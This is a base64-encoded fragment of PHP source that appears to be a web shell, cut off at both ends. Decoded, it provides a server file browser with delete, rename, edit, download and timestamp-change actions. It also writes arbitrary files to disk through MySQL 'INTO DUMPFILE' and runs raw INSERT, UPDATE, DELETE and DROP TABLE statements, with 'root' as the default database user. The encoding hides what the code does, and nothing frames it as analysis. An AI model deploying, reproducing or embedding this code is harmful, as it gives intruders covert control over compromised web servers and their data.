gICAgICAgICAgICAgICAkZGlyZGJbJ2ZpbGVvd25lciddPWdldFVzZXIoJGZpbGVwYXRoKTsgDQogICAgICAgICAgICAgICAgJGRpcmRiWydkaXJsaW5rJ109JG5vd3BhdGg7IA0KICAgICAgICAgICAgICAgICRkaXJkYlsnc2VydmVyX2xpbmsnXT0kZmlsZXBhdGg7IA0KICAgICAgICAgICAgICAgICRkaXJkYlsnY2xpZW50X2xpbmsnXT11ZSgkZmlsZXBhdGgpOyANCiAgICAgICAgICAgICAgICAkZGlyZGF0YVtdPSRkaXJkYjsgDQogICAgICAgICAgICB9IGVsc2UgeyAgICAgICAgIA0KICAgICAgICAgICAgICAgICRmaWxlZGJbJ2ZpbGVuYW1lJ109JGZpbGU7IA0KICAgICAgICAgICAgICAgICRmaWxlZGJbJ3NpemUnXT1zaXplY291bnQoQGZpbGVzaXplKCRmaWxlcGF0aCkpOyANCiAgICAgICAgICAgICAgICAkZmlsZWRiWydtdGltZSddPUBkYXRlKCdZLW0tZCBIOmk6cycsZmlsZW10aW1lKCRmaWxlcGF0aCkpOyANCiAgICAgICAgICAgICAgICAkZmlsZWRiWydmaWxlY2htb2QnXT1nZXRDaG1vZCgkZmlsZXBhdGgpOyANCiAgICAgICAgICAgICAgICAkZmlsZWRiWydmaWxlcGVybSddPWdldFBlcm1zKCRmaWxlcGF0aCk7IA0KICAgICAgICAgICAgICAgICRmaWxlZGJbJ2ZpbGVvd25lciddPWdldFVzZXIoJGZpbGVwYXRoKTsgDQogICAgICAgICAgICAgICAgJGZpbGVkYlsnZGlybGluayddPSRub3dwYXRoOyANCiAgICAgICAgICAgICAgICAkZmlsZWRiWydzZXJ2ZXJfbGluayddPSRmaWxlcGF0aDsgDQogICAgICAgICAgICAgICAgJGZpbGVkYlsnY2xpZW50X2xpbmsnXT11ZSgkZmlsZXBhdGgpOyANCiAgICAgICAgICAgICAgICAkZmlsZWRhdGFbXT0kZmlsZWRiOyANCiAgICAgICAgICAgIH0gDQogICAgICAgIH0vLyB3aGlsZSANCiAgICAgICAgdW5zZXQoJGRpcmRiKTsgDQogICAgICAgIHVuc2V0KCRmaWxlZGIpOyANCiAgICAgICAgQGNsb3NlZGlyKCRkaXJzKTsgDQogICAgfSANCiAgICBAc29ydCgkZGlyZGF0YSk7IA0KICAgIEBzb3J0KCRmaWxlZGF0YSk7IA0KICAgICRkaXJfaSA9ICcwJzsgDQogICAgZm9yZWFjaCgkZGlyZGF0YSBhcyAka2V5ID0+ICRkaXJkYil7IA0KICAgICAgICBpZigkZGlyZGJbJ2ZpbGVuYW1lJ10hPScuLicgJiYgJGRpcmRiWydmaWxlbmFtZSddIT0nLicpIHsgDQogICAgICAgICAgICAkdGhpc2JnID0gYmcoKTsgDQogICAgICAgICAgICBwKCc8dHIgY2xhc3M9IicuJHRoaXNiZy4nIiBvbm1vdXNlb3Zlcj0idGhpcy5jbGFzc05hbWU9XCdmb2N1c1wnOyIgb25tb3VzZW91dD0idGhpcy5jbGFzc05hbWU9XCcnLiR0aGlzYmcuJ1wnOyI+Jyk7IA0KICAgICAgICAgICAgcCgnPHRkIHdpZHRoPSIyJSIgbm93cmFwPjxmb250IGZhY2U9IndpbmdkaW5ncyIgc2l6ZT0iMyI+MDwvZm9udD48L3RkPicpOyANCiAgICAgICAgICAgIHAoJzx0ZD48YSBocmVmPSJqYXZhc2NyaXB0OmdvZGlyKFwnJy4kZGlyZGJbJ3NlcnZlcl9saW5rJ10uJ1wnKTsiPicuJGRpcmRiWydmaWxlbmFtZSddLic8L2E+PC90ZD4nKTsgDQogICAgICAgICAgICBwKCc8dGQgbm93cmFwPicuJGRpcmRiWydtdGltZSddLic8L3RkPicpOyANCiAgICAgICAgICAgIHAoJzx0ZCBub3dyYXA+LS08L3RkPicpOyANCiAgICAgICAgICAgIHAoJzx0ZCBub3dyYXA+Jyk7IA0KICAgICAgICAgICAgcCgnPGEgaHJlZj0iamF2YXNjcmlwdDpmaWxlcGVybShcJycuJGRpcmRiWydzZXJ2ZXJfbGluayddLidcJyk7Ij4nLiRkaXJkYlsnZGlyY2htb2QnXS4nPC9hPiAvICcpOyANCiAgICAgICAgICAgIHAoJzxhIGhyZWY9ImphdmFzY3JpcHQ6ZmlsZXBlcm0oXCcnLiRkaXJkYlsnc2VydmVyX2xpbmsnXS4nXCcpOyI+Jy4kZGlyZGJbJ2RpcnBlcm0nXS4nPC9hPicuJGRpcmRiWydmaWxlb3duZXInXS4nPC90ZD4nKTsgDQogICAgICAgICAgICBwKCc8dGQgbm93cmFwPjxhIGhyZWY9ImphdmFzY3JpcHQ6ZG9maWxlKFwnZGVsZGlyXCcsXCcnLiRkaXJkYlsnc2VydmVyX2xpbmsnXS4nXCcsXCdBcmUgeW91IHN1cmUgd2lsbCBkZWxldGUgJy4kZGlyZGJbJ2ZpbGVuYW1lJ10uJz8gXFxuXFxuSWYgbm9uLWVtcHR5IGRpcmVjdG9yeSwgd2lsbCBiZSBkZWxldGUgYWxsIHRoZSBmaWxlcy5cJykiPkRlbDwvYT4gfCA8YSBocmVmPSJqYXZhc2NyaXB0OnJlbmFtZShcJycuJGRpcmRiWydzZXJ2ZXJfbGluayddLidcJyk7Ij5SZW5hbWU8L2E+PC90ZD4nKTsgDQogICAgICAgICAgICBwKCc8L3RyPicpOyANCiAgICAgICAgICAgICRkaXJfaSsrOyANCiAgICAgICAgfSBlbHNlIHsgDQogICAgICAgICAgICBpZigkZGlyZGJbJ2ZpbGVuYW1lJ109PScuLicpIHsgDQogICAgICAgICAgICAgICAgcCgnPHRyIGNsYXNzPScuYmcoKS4nPicpOyANCiAgICAgICAgICAgICAgICBwKCc8dGQgYWxpZ249ImNlbnRlciI+PGZvbnQgZmFjZT0iV2luZ2RpbmdzIDMiIHNpemU9ND49PC9mb250PjwvdGQ+PHRkIG5vd3JhcCBjb2xzcGFuPSI1Ij48YSBocmVmPSJqYXZhc2NyaXB0OmdvZGlyKFwnJy5nZXRVcFBhdGgoJG5vd3BhdGgpLidcJyk7Ij5QYXJlbnQgRGlyZWN0b3J5PC9hPjwvdGQ+Jyk7IA0KICAgICAgICAgICAgICAgIHAoJzwvdHI+Jyk7IA0KICAgICAgICAgICAgfSANCiAgICAgICAgfSANCiAgICB9IA0KDQogICAgcCgnPHRyIGJnY29sb3I9IiNkZGRkZGQiIHN0bHllPSJib3JkZXItdG9wOjFweCBzb2xpZCAjZmZmO2JvcmRlci1ib3R0b206MXB4IHNvbGlkICNkZGQ7Ij48dGQgY29sc3Bhbj0iNiIgaGVpZ2h0PSI1Ij48L3RkPjwvdHI+Jyk7IA0KICAgIHAoJzxmb3JtIGlkPSJmaWxlbGlzdCIgbmFtZT0iZmlsZWxpc3QiIGFjdGlvbj0iJy4kc2VsZi4nIiBtZXRob2Q9InBvc3QiPicpOyANCiAgICBtYWtlaGlkZSgnYWN0aW9uJywnZmlsZScpOyANCiAgICBtYWtlaGlkZSgndGhlZmlsZScpOyANCiAgICBtYWtlaGlkZSgnZG9pbmcnKTsgDQogICAgbWFrZWhpZGUoJ2RpcicsJG5vd3BhdGgpOyANCiAgICAkZmlsZV9pID0gJzAnOyANCiAgICBmb3JlYWNoKCRmaWxlZGF0YSBhcyAka2V5ID0+ICRmaWxlZGIpeyANCiAgICAgICAgaWYoJGZpbGVkYlsnZmlsZW5hbWUnXSE9Jy4uJyAmJiAkZmlsZWRiWydmaWxlbmFtZSddIT0nLicpIHsgDQogICAgICAgICAgICAkZmlsZXVybCA9IHN0cl9yZXBsYWNlKFNBX1JPT1QsJycsJGZpbGVkYlsnc2VydmVyX2xpbmsnXSk7IA0KICAgICAgICAgICAgJHRoaXNiZyA9IGJnKCk7IA0KICAgICAgICAgICAgcCgnPHRyIGNsYXNzPSInLiR0aGlzYmcuJyIgb25tb3VzZW92ZXI9InRoaXMuY2xhc3NOYW1lPVwnZm9jdXNcJzsiIG9ubW91c2VvdXQ9InRoaXMuY2xhc3NOYW1lPVwnJy4kdGhpc2JnLidcJzsiPicpOyANCiAgICAgICAgICAgIHAoJzx0ZCB3aWR0aD0iMiUiIG5vd3JhcD48aW5wdXQgdHlwZT0iY2hlY2tib3giIHZhbHVlPSIxIiBuYW1lPSJkbFsnLiRmaWxlZGJbJ3NlcnZlcl9saW5rJ10uJ10iPjwvdGQ+Jyk7IA0KICAgICAgICAgICAgcCgnPHRkPjxhIGhyZWY9IicuJGZpbGV1cmwuJyIgdGFyZ2V0PSJfYmxhbmsiPicuJGZpbGVkYlsnZmlsZW5hbWUnXS4nPC9hPjwvdGQ+Jyk7IA0KICAgICAgICAgICAgcCgnPHRkIG5vd3JhcD4nLiRmaWxlZGJbJ210aW1lJ10uJzwvdGQ+Jyk7IA0KICAgICAgICAgICAgcCgnPHRkIG5vd3JhcD4nLiRmaWxlZGJbJ3NpemUnXS4nPC90ZD4nKTsgDQogICAgICAgICAgICBwKCc8dGQgbm93cmFwPicpOyANCiAgICAgICAgICAgIHAoJzxhIGhyZWY9ImphdmFzY3JpcHQ6ZmlsZXBlcm0oXCcnLiRmaWxlZGJbJ3NlcnZlcl9saW5rJ10uJ1wnKTsiPicuJGZpbGVkYlsnZmlsZWNobW9kJ10uJzwvYT4gLyAnKTsgDQogICAgICAgICAgICBwKCc8YSBocmVmPSJqYXZhc2NyaXB0OmZpbGVwZXJtKFwnJy4kZmlsZWRiWydzZXJ2ZXJfbGluayddLidcJyk7Ij4nLiRmaWxlZGJbJ2ZpbGVwZXJtJ10uJzwvYT4nLiRmaWxlZGJbJ2ZpbGVvd25lciddLic8L3RkPicpOyANCiAgICAgICAgICAgIHAoJzx0ZCBub3dyYXA+Jyk7IA0KICAgICAgICAgICAgcCgnPGEgaHJlZj0iamF2YXNjcmlwdDpkb2ZpbGUoXCdkb3duZmlsZVwnLFwnJy4kZmlsZWRiWydzZXJ2ZXJfbGluayddLidcJyk7Ij5Eb3duPC9hPiB8ICcpOyANCiAgICAgICAgICAgIHAoJzxhIGhyZWY9ImphdmFzY3JpcHQ6Y29weWZpbGUoXCcnLiRmaWxlZGJbJ3NlcnZlcl9saW5rJ10uJ1wnKTsiPkNvcHk8L2E+IHwgJyk7IA0KICAgICAgICAgICAgcCgnPGEgaHJlZj0iamF2YXNjcmlwdDpvcGZpbGUoXCdlZGl0ZmlsZVwnLFwnJy4kZmlsZWRiWydzZXJ2ZXJfbGluayddLidcJyxcJycuJGZpbGVkYlsnZGlybGluayddLidcJyk7Ij5FZGl0PC9hPiB8ICcpOyANCiAgICAgICAgICAgIHAoJzxhIGhyZWY9ImphdmFzY3JpcHQ6cmVuYW1lKFwnJy4kZmlsZWRiWydzZXJ2ZXJfbGluayddLidcJyk7Ij5SZW5hbWU8L2E+IHwgJyk7IA0KICAgICAgICAgICAgcCgnPGEgaHJlZj0iamF2YXNjcmlwdDpvcGZpbGUoXCduZXd0aW1lXCcsXCcnLiRmaWxlZGJbJ3NlcnZlcl9saW5rJ10uJ1wnLFwnJy4kZmlsZWRiWydkaXJsaW5rJ10uJ1wnKTsiPlRpbWU8L2E+Jyk7IA0KICAgICAgICAgICAgcCgnPC90ZD48L3RyPicpOyANCiAgICAgICAgICAgICRmaWxlX2krKzsgDQogICAgICAgIH0gDQogICAgfSANCiAgICBwKCc8dHIgY2xhc3M9IicuYmcoKS4nIj48dGQgYWxpZ249ImNlbnRlciI+PGlucHV0IG5hbWU9ImNoa2FsbCIgdmFsdWU9Im9uIiB0eXBlPSJjaGVja2JveCIgb25jbGljaz0iQ2hlY2tBbGwodGhpcy5mb3JtKSIgLz48L3RkPjx0ZD48YSBocmVmPSJqYXZhc2NyaXB0OmRvZmlsZShcJ2Rvd25yYXJcJyk7Ij5QYWNraW5nIGRvd25sb2FkIHNlbGVjdGVkPC9hPiAtIDxhIGhyZWY9ImphdmFzY3JpcHQ6ZG9maWxlKFwnZGVsZmlsZXNcJyk7Ij5EZWxldGUgc2VsZWN0ZWQ8L2E+PC90ZD48dGQgY29sc3Bhbj0iNCIgYWxpZ249InJpZ2h0Ij4nLiRkaXJfaS4nIGRpcmVjdG9yaWVzIC8gJy4kZmlsZV9pLicgZmlsZXM8L3RkPjwvdHI+Jyk7IA0KICAgIHAoJzwvZm9ybT48L3RhYmxlPicpOyANCn0vLyBlbmQgZGlyIA0KDQplbHNlaWYgKCRhY3Rpb24gPT0gJ3NxbGZpbGUnKSB7IA0KICAgIGlmKCRkb2luZz09Im15c3FsdXBsb2FkIil7IA0KICAgICAgICAkZmlsZSA9ICRfRklMRVNbJ3VwbG9hZGZpbGUnXTsgDQogICAgICAgICRmaWxlbmFtZSA9ICRmaWxlWyd0bXBfbmFtZSddOyANCiAgICAgICAgaWYgKGZpbGVfZXhpc3RzKCRzYXZlcGF0aCkpIHsgDQogICAgICAgICAgICBtKCdUaGUgZ29hbCBmaWxlIGhhcyBhbHJlYWR5IGV4aXN0ZWQnKTsgDQogICAgICAgIH0gZWxzZSB7IA0KICAgICAgICAgICAgaWYoISRmaWxlbmFtZSkgeyANCiAgICAgICAgICAgICAgICBtKCdQbGVhc2UgY2hvb3NlIGEgZmlsZScpOyANCiAgICAgICAgICAgIH0gZWxzZSB7IA0KICAgICAgICAgICAgICAgICRmcD1AZm9wZW4oJGZpbGVuYW1lLCdyJyk7IA0KICAgICAgICAgICAgICAgICRjb250ZW50cz1AZnJlYWQoJGZwLCBmaWxlc2l6ZSgkZmlsZW5hbWUpKTsgDQogICAgICAgICAgICAgICAgQGZjbG9zZSgkZnApOyANCiAgICAgICAgICAgICAgICAkY29udGVudHMgPSBiaW4yaGV4KCRjb250ZW50cyk7IA0KICAgICAgICAgICAgICAgIGlmKCEkdXBuYW1lKSAkdXBuYW1lID0gJGZpbGVbJ25hbWUnXTsgDQogICAgICAgICAgICAgICAgZGJjb25uKCRkYmhvc3QsJGRidXNlciwkZGJwYXNzLCRkYm5hbWUsJGNoYXJzZXQsJGRicG9ydCk7IA0KICAgICAgICAgICAgICAgICRyZXN1bHQgPSBxKCJTRUxFQ1QgMHh7JGNvbnRlbnRzfSBGUk9NIG15c3FsLnVzZXIgSU5UTyBEVU1QRklMRSAnJHNhdmVwYXRoJzsiKTsgDQogICAgICAgICAgICAgICAgbSgkcmVzdWx0ID8gJ1VwbG9hZCBzdWNjZXNzJyA6ICdVcGxvYWQgaGFzIGZhaWxlZDogJy5teXNxbF9lcnJvcigpKTsgDQogICAgICAgICAgICB9IA0KICAgICAgICB9IA0KICAgIH0gDQo/PiANCjxzY3JpcHQgdHlwZT0idGV4dC9qYXZhc2NyaXB0Ij4gDQpmdW5jdGlvbiBteXNxbGZpbGUoZG9pbmcpeyANCiAgICBpZighZG9pbmcpIHJldHVybjsgDQogICAgJCgnZG9pbmcnKS52YWx1ZT1kb2luZzsgDQogICAgJCgnbXlzcWxmaWxlJykuZGJob3N0LnZhbHVlPSQoJ2RiaW5mbycpLmRiaG9zdC52YWx1ZTsgDQogICAgJCgnbXlzcWxmaWxlJykuZGJwb3J0LnZhbHVlPSQoJ2RiaW5mbycpLmRicG9ydC52YWx1ZTsgDQogICAgJCgnbXlzcWxmaWxlJykuZGJ1c2VyLnZhbHVlPSQoJ2RiaW5mbycpLmRidXNlci52YWx1ZTsgDQogICAgJCgnbXlzcWxmaWxlJykuZGJwYXNzLnZhbHVlPSQoJ2RiaW5mbycpLmRicGFzcy52YWx1ZTsgDQogICAgJCgnbXlzcWxmaWxlJykuZGJuYW1lLnZhbHVlPSQoJ2RiaW5mbycpLmRibmFtZS52YWx1ZTsgDQogICAgJCgnbXlzcWxmaWxlJykuY2hhcnNldC52YWx1ZT0kKCdkYmluZm8nKS5jaGFyc2V0LnZhbHVlOyANCiAgICAkKCdteXNxbGZpbGUnKS5zdWJtaXQoKTsgDQp9IA0KPC9zY3JpcHQ+IA0KPD9waHAgDQogICAgISRkYmhvc3QgJiYgJGRiaG9zdCA9ICdsb2NhbGhvc3QnOyANCiAgICAhJGRidXNlciAmJiAkZGJ1c2VyID0gJ3Jvb3QnOyANCiAgICAhJGRicG9ydCAmJiAkZGJwb3J0ID0gJzMzMDYnOyANCiAgICAkY2hhcnNldHMgPSBhcnJheSgnJz0+J0RlZmF1bHQnLCdnYmsnPT4nR0JLJywgJ2JpZzUnPT4nQmlnNScsICd1dGY4Jz0+J1VURi04JywgJ2xhdGluMSc9PidMYXRpbjEnKTsgDQogICAgZm9ybWhlYWQoYXJyYXkoJ3RpdGxlJz0+J01ZU1FMIEluZm9ybWF0aW9uJywnbmFtZSc9PidkYmluZm8nKSk7IA0KICAgIG1ha2VoaWRlKCdhY3Rpb24nLCdzcWxmaWxlJyk7IA0KICAgIHAoJzxwPicpOyANCiAgICBwKCdEQkhvc3Q6Jyk7IA0KICAgIG1ha2VpbnB1dChhcnJheSgnbmFtZSc9PidkYmhvc3QnLCdzaXplJz0+MjAsJ3ZhbHVlJz0+JGRiaG9zdCkpOyANCiAgICBwKCc6Jyk7IA0KICAgIG1ha2VpbnB1dChhcnJheSgnbmFtZSc9PidkYnBvcnQnLCdzaXplJz0+NCwndmFsdWUnPT4kZGJwb3J0KSk7IA0KICAgIHAoJ0RCVXNlcjonKTsgDQogICAgbWFrZWlucHV0KGFycmF5KCduYW1lJz0+J2RidXNlcicsJ3NpemUnPT4xNSwndmFsdWUnPT4kZGJ1c2VyKSk7IA0KICAgIHAoJ0RCUGFzczonKTsgDQogICAgbWFrZWlucHV0KGFycmF5KCduYW1lJz0+J2RicGFzcycsJ3NpemUnPT4xNSwndmFsdWUnPT4kZGJwYXNzKSk7IA0KICAgIHAoJ0RCTmFtZTonKTsgDQogICAgbWFrZWlucHV0KGFycmF5KCduYW1lJz0+J2RibmFtZScsJ3NpemUnPT4xNSwndmFsdWUnPT4kZGJuYW1lKSk7IA0KICAgIHAoJ0RCQ2hhcnNldDonKTsgDQogICAgbWFrZXNlbGVjdChhcnJheSgnbmFtZSc9PidjaGFyc2V0Jywnb3B0aW9uJz0+JGNoYXJzZXRzLCdzZWxlY3RlZCc9PiRjaGFyc2V0KSk7IA0KICAgIHAoJzwvcD4nKTsgDQogICAgZm9ybWZvb3QoKTsgDQogICAgcCgnPGZvcm0gYWN0aW9uPSInLiRzZWxmLiciIG1ldGhvZD0iUE9TVCIgZW5jdHlwZT0ibXVsdGlwYXJ0L2Zvcm0tZGF0YSIgbmFtZT0ibXlzcWxmaWxlIiBpZD0ibXlzcWxmaWxlIj4nKTsgDQogICAgcCgnPGgyPlVwbG9hZCBmaWxlPC9oMj4nKTsgDQogICAgcCgnPHA+PGI+VGhpcyBvcGVyYXRpb24gdGhlIERCIHVzZXIgbXVzdCBoYXMgRklMRSBwcml2aWxlZ2U8L2I+PC9wPicpOyANCiAgICBwKCc8cD5TYXZlIHBhdGgoZnVsbHBhdGgpOiA8aW5wdXQgY2xhc3M9ImlucHV0IiBuYW1lPSJzYXZlcGF0aCIgc2l6ZT0iNDUiIHR5cGU9InRleHQiIC8+IENob29zZSBhIGZpbGU6IDxpbnB1dCBjbGFzcz0iaW5wdXQiIG5hbWU9InVwbG9hZGZpbGUiIHR5cGU9ImZpbGUiIC8+IDxhIGhyZWY9ImphdmFzY3JpcHQ6bXlzcWxmaWxlKFwnbXlzcWx1cGxvYWRcJyk7Ij5VcGxvYWQ8L2E+PC9wPicpOyANCiAgICBwKCc8aDI+RG93bmxvYWQgZmlsZTwvaDI+Jyk7IA0KICAgIHAoJzxwPkZpbGU6IDxpbnB1dCBjbGFzcz0iaW5wdXQiIG5hbWU9Im15c3FsZGxmaWxlIiBzaXplPSIxMTUiIHR5cGU9InRleHQiIC8+IDxhIGhyZWY9ImphdmFzY3JpcHQ6bXlzcWxmaWxlKFwnbXlzcWxkb3duXCcpOyI+RG93bmxvYWQ8L2E+PC9wPicpOyANCiAgICBtYWtlaGlkZSgnZGJob3N0Jyk7IA0KICAgIG1ha2VoaWRlKCdkYnBvcnQnKTsgDQogICAgbWFrZWhpZGUoJ2RidXNlcicpOyANCiAgICBtYWtlaGlkZSgnZGJwYXNzJyk7IA0KICAgIG1ha2VoaWRlKCdkYm5hbWUnKTsgDQogICAgbWFrZWhpZGUoJ2NoYXJzZXQnKTsgDQogICAgbWFrZWhpZGUoJ2RvaW5nJyk7IA0KICAgIG1ha2VoaWRlKCdhY3Rpb24nLCdzcWxmaWxlJyk7IA0KICAgIHAoJzwvZm9ybT4nKTsgDQp9IA0KDQplbHNlaWYgKCRhY3Rpb24gPT0gJ3NxbGFkbWluJykgeyANCiAgICAhJGRiaG9zdCAmJiAkZGJob3N0ID0gJ2xvY2FsaG9zdCc7IA0KICAgICEkZGJ1c2VyICYmICRkYnVzZXIgPSAncm9vdCc7IA0KICAgICEkZGJwb3J0ICYmICRkYnBvcnQgPSAnMzMwNic7IA0KICAgICRkYmZvcm0gPSAnPGlucHV0IHR5cGU9ImhpZGRlbiIgaWQ9ImNvbm5lY3QiIG5hbWU9ImNvbm5lY3QiIHZhbHVlPSIxIiAvPic7IA0KICAgIGlmKGlzc2V0KCRkYmhvc3QpKXsgDQogICAgICAgICRkYmZvcm0gLj0gIjxpbnB1dCB0eXBlPVwiaGlkZGVuXCIgaWQ9XCJkYmhvc3RcIiBuYW1lPVwiZGJob3N0XCIgdmFsdWU9XCIkZGJob3N0XCIgLz5cbiI7IA0KICAgIH0gDQogICAgaWYoaXNzZXQoJGRidXNlcikpIHsgDQogICAgICAgICRkYmZvcm0gLj0gIjxpbnB1dCB0eXBlPVwiaGlkZGVuXCIgaWQ9XCJkYnVzZXJcIiBuYW1lPVwiZGJ1c2VyXCIgdmFsdWU9XCIkZGJ1c2VyXCIgLz5cbiI7IA0KICAgIH0gDQogICAgaWYoaXNzZXQoJGRicGFzcykpIHsgDQogICAgICAgICRkYmZvcm0gLj0gIjxpbnB1dCB0eXBlPVwiaGlkZGVuXCIgaWQ9XCJkYnBhc3NcIiBuYW1lPVwiZGJwYXNzXCIgdmFsdWU9XCIkZGJwYXNzXCIgLz5cbiI7IA0KICAgIH0gDQogICAgaWYoaXNzZXQoJGRicG9ydCkpIHsgDQogICAgICAgICRkYmZvcm0gLj0gIjxpbnB1dCB0eXBlPVwiaGlkZGVuXCIgaWQ9XCJkYnBvcnRcIiBuYW1lPVwiZGJwb3J0XCIgdmFsdWU9XCIkZGJwb3J0XCIgLz5cbiI7IA0KICAgIH0gDQogICAgaWYoaXNzZXQoJGRibmFtZSkpIHsgDQogICAgICAgICRkYmZvcm0gLj0gIjxpbnB1dCB0eXBlPVwiaGlkZGVuXCIgaWQ9XCJkYm5hbWVcIiBuYW1lPVwiZGJuYW1lXCIgdmFsdWU9XCIkZGJuYW1lXCIgLz5cbiI7IA0KICAgIH0gDQogICAgaWYoaXNzZXQoJGNoYXJzZXQpKSB7IA0KICAgICAgICAkZGJmb3JtIC49ICI8aW5wdXQgdHlwZT1cImhpZGRlblwiIGlkPVwiY2hhcnNldFwiIG5hbWU9XCJjaGFyc2V0XCIgdmFsdWU9XCIkY2hhcnNldFwiIC8+XG4iOyANCiAgICB9IA0KDQogICAgaWYgKCRkb2luZyA9PSAnYmFja3VwbXlzcWwnICYmICRzYXZlYXNmaWxlKSB7IA0KICAgICAgICBpZiAoISR0YWJsZSkgeyANCiAgICAgICAgICAgIG0oJ1BsZWFzZSBjaG9vc2UgdGhlIHRhYmxlJyk7IA0KICAgICAgICB9IGVsc2UgeyANCiAgICAgICAgICAgIGRiY29ubigkZGJob3N0LCRkYnVzZXIsJGRicGFzcywkZGJuYW1lLCRjaGFyc2V0LCRkYnBvcnQpOyANCiAgICAgICAgICAgICR0YWJsZSA9IGFycmF5X2ZsaXAoJHRhYmxlKTsgDQogICAgICAgICAgICAkZnAgPSBAZm9wZW4oJHBhdGgsJ3cnKTsgDQogICAgICAgICAgICBpZiAoJGZwKSB7IA0KICAgICAgICAgICAgICAgICRyZXN1bHQgPSBxKCdTSE9XIHRhYmxlcycpOyANCiAgICAgICAgICAgICAgICBpZiAoISRyZXN1bHQpIHAoJzxoMj4nLm15c3FsX2Vycm9yKCkuJzwvaDI+Jyk7IA0KICAgICAgICAgICAgICAgICRteXNxbGRhdGEgPSAnJzsgDQogICAgICAgICAgICAgICAgd2hpbGUgKCRjdXJyb3cgPSBteXNxbF9mZXRjaF9hcnJheSgkcmVzdWx0KSkgeyANCiAgICAgICAgICAgICAgICAgICAgaWYgKGlzc2V0KCR0YWJsZVskY3Vycm93WzBdXSkpIHsgDQogICAgICAgICAgICAgICAgICAgICAgICBzcWxkdW1wdGFibGUoJGN1cnJvd1swXSwgJGZwKTsgDQogICAgICAgICAgICAgICAgICAgIH0gDQogICAgICAgICAgICAgICAgfSANCiAgICAgICAgICAgICAgICBmY2xvc2UoJGZwKTsgDQogICAgICAgICAgICAgICAgJGZpbGV1cmwgPSBzdHJfcmVwbGFjZShTQV9ST09ULCcnLCRwYXRoKTsgDQogICAgICAgICAgICAgICAgbSgnRGF0YWJhc2UgaGFzIHN1Y2Nlc3MgYmFja3VwIHRvIDxhIGhyZWY9IicuJGZpbGV1cmwuJyIgdGFyZ2V0PSJfYmxhbmsiPicuJHBhdGguJzwvYT4nKTsgDQogICAgICAgICAgICAgICAgbXlzcWxfY2xvc2UoKTsgDQogICAgICAgICAgICB9IGVsc2UgeyANCiAgICAgICAgICAgICAgICBtKCdCYWNrdXAgZmFpbGVkJyk7IA0KICAgICAgICAgICAgfSANCiAgICAgICAgfSANCiAgICB9IA0KICAgIGlmICgkaW5zZXJ0ICYmICRpbnNlcnRzcWwpIHsgDQogICAgICAgICRrZXlzdHIgPSAkdmFsc3RyID0gJHRtcCA9ICcnOyANCiAgICAgICAgZm9yZWFjaCgkaW5zZXJ0c3FsIGFzICRrZXkgPT4gJHZhbCkgeyANCiAgICAgICAgICAgIGlmICgkdmFsKSB7IA0KICAgICAgICAgICAgICAgICRrZXlzdHIgLj0gJHRtcC4ka2V5OyANCiAgICAgICAgICAgICAgICAkdmFsc3RyIC49ICR0bXAuIiciLmFkZHNsYXNoZXMoJHZhbCkuIiciOyANCiAgICAgICAgICAgICAgICAkdG1wID0gJywnOyANCiAgICAgICAgICAgIH0gDQogICAgICAgIH0gDQogICAgICAgIGlmICgka2V5c3RyICYmICR2YWxzdHIpIHsgDQogICAgICAgICAgICBkYmNvbm4oJGRiaG9zdCwkZGJ1c2VyLCRkYnBhc3MsJGRibmFtZSwkY2hhcnNldCwkZGJwb3J0KTsgDQogICAgICAgICAgICBtKHEoIklOU0VSVCBJTlRPICR0YWJsZW5hbWUgKCRrZXlzdHIpIFZBTFVFUyAoJHZhbHN0cikiKSA/ICdJbnNlcnQgbmV3IHJlY29yZCBvZiBzdWNjZXNzJyA6IG15c3FsX2Vycm9yKCkpOyANCiAgICAgICAgfSANCiAgICB9IA0KICAgIGlmICgkdXBkYXRlICYmICRpbnNlcnRzcWwgJiYgJGJhc2U2NCkgeyANCiAgICAgICAgJHZhbHN0ciA9ICR0bXAgPSAnJzsgDQogICAgICAgIGZvcmVhY2goJGluc2VydHNxbCBhcyAka2V5ID0+ICR2YWwpIHsgDQogICAgICAgICAgICAkdmFsc3RyIC49ICR0bXAuJGtleS4iPSciLmFkZHNsYXNoZXMoJHZhbCkuIiciOyANCiAgICAgICAgICAgICR0bXAgPSAnLCc7IA0KICAgICAgICB9IA0KICAgICAgICBpZiAoJHZhbHN0cikgeyANCiAgICAgICAgICAgICR3aGVyZSA9IGJhc2U2NF9kZWNvZGUoJGJhc2U2NCk7IA0KICAgICAgICAgICAgZGJjb25uKCRkYmhvc3QsJGRidXNlciwkZGJwYXNzLCRkYm5hbWUsJGNoYXJzZXQsJGRicG9ydCk7IA0KICAgICAgICAgICAgbShxKCJVUERBVEUgJHRhYmxlbmFtZSBTRVQgJHZhbHN0ciBXSEVSRSAkd2hlcmUgTElNSVQgMSIpID8gJ1JlY29yZCB1cGRhdGluZycgOiBteXNxbF9lcnJvcigpKTsgDQogICAgICAgIH0gDQogICAgfSANCiAgICBpZiAoJGRvaW5nID09ICdkZWwnICYmICRiYXNlNjQpIHsgDQogICAgICAgICR3aGVyZSA9IGJhc2U2NF9kZWNvZGUoJGJhc2U2NCk7IA0KICAgICAgICAkZGVsZXRlX3NxbCA9ICJERUxFVEUgRlJPTSAkdGFibGVuYW1lIFdIRVJFICR3aGVyZSI7IA0KICAgICAgICBkYmNvbm4oJGRiaG9zdCwkZGJ1c2VyLCRkYnBhc3MsJGRibmFtZSwkY2hhcnNldCwkZGJwb3J0KTsgDQogICAgICAgIG0ocSgiREVMRVRFIEZST00gJHRhYmxlbmFtZSBXSEVSRSAkd2hlcmUiKSA/ICdEZWxldGlvbiByZWNvcmQgb2Ygc3VjY2VzcycgOiBteXNxbF9lcnJvcigpKTsgDQogICAgfSANCg0KICAgIGlmICgkdGFibGVuYW1lICYmICRkb2luZyA9PSAnZHJvcCcpIHsgDQogICAgICAgIGRiY29ubigkZGJob3N0LCRkYnVzZXIsJGRicGFzcywkZGJuYW1lLCRjaGFyc2V0LCRkYnBvcnQpOyANCiAgICAgICAgaWYgKHEoIkRST1AgVEFCTEUgJHRhYmxlbmFtZSIpKSB7IA0KICAgICAgICAgICAgbSgnRHJvcCB0YWJsZSBvZiBzdWNjZXNzJyk7IA0KICAgICAgICAgICAgJHRhYmxlbmFtZSA9ICcnOyANCiAgICAgICAgfSBlbHNlIHsgDQogICAgICAgICAgICBtKG15c3FsX2Vycm9yKCkpOyANCiAgICAgICAgfSANCiAgICB9IA0KDQogICAgJGNoYXJzZXRzID0gYXJyYXkoJyc9PidEZWZhdWx0JywnZ2JrJz0+J0dCSycsICdiaWc1Jz0+J0JpZzUnLCAndXRmOCc9PidVVEYtOCcsICdsYXRpbjEnPT4nTGF0aW4xJyk7IA0KDQogICAgZm9ybWhlYWQo